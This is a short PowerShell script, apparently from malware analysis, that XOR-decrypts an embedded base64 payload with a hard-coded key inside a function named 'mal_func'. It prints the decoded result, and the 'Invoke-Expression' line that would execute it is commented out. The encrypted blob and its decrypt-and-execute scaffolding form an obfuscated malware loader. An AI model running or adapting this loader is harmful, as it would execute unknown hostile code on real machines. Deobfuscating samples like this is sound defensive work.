
$var_1 = '2r0mAlBPkJaP5Hxhc'
$var_2 = 'FgdCAWFRYnIDPhUgD2dXWVcFXARYb1h2flp5UH9cJh4HE1MVVUImHjUjE2QEKFBqdWJuOFZHCCMvLjkOJBVwCGg2DRQfPVIHJA82cDgzEiRQJVYmBkZcZwgjLy45DiQVXT9FckwLVxNUCDMiIz0OalxwFxBVOxNXEVkMLUEKNQouBCIXRXJMC1cTVAgzOiM8Hi9BbRVqCSENSkp2XjUZCBQjEgYfcC4oIglQE1kdGA0RFVonDjJ/eiE6Gl1AQgcPCywGLyIrJlA+NlAxABlFVS48ARIEJAk9RTI+ClF1K0E9KCAqGhpobFoRPx0KIF4bVQM1Qgo1Ci4EIkZmOQwHGlZYCCAIJyIlKww1GWhcAAZTFlUfFw0uJQ5jbFo4QlwOCl4XchQ1CTFwVmpFJ1AqOwQKVxxEQwUDNT4HJQA0cSkMCUsWB0IBaGFIXWFuACNGLRUKD0tSDU0aPzsjHy8MfmctHgQGUQZZAi9CAyMYLwwyWTElUll+HVEJaUgkOQcvIylBLQtBbjh/OkkkAjYiEhoOOVs8WFVDFhNDHiQBIDwSZCQ+QToBOAxbHERgSwUkcENuBD5BOgE4DFscRE1sAidwTyQUPFlhWBNuOFIQTWFIJz4fOBgAWiEWHE17HEYCKglqdAU/DTwZaDhASht/OhBMZg=='

function mal_func ($var_2, $var_1) {
    $mal_func_var1 = [System.Text.Encoding]::UTF8.GetBytes($var_1)
    $mal_func_var2 = [Convert]::FromBase64String($var_2)
    $mal_func_var3 = New-Object byte[]($mal_func_var2.Length)

    for ($i = 0; $i -lt $mal_func_var2.Length; $i++) {
        $mal_func_var3[$i] = $mal_func_var2[$i] -bxor $mal_func_var1[$i % $mal_func_var1.Length]
    }

    return [System.Text.Encoding]::UTF8.GetString($mal_func_var3)
}
mal_func $var_2 $var_1
# Invoke-Expression $(mal_func $var_2 $var_1)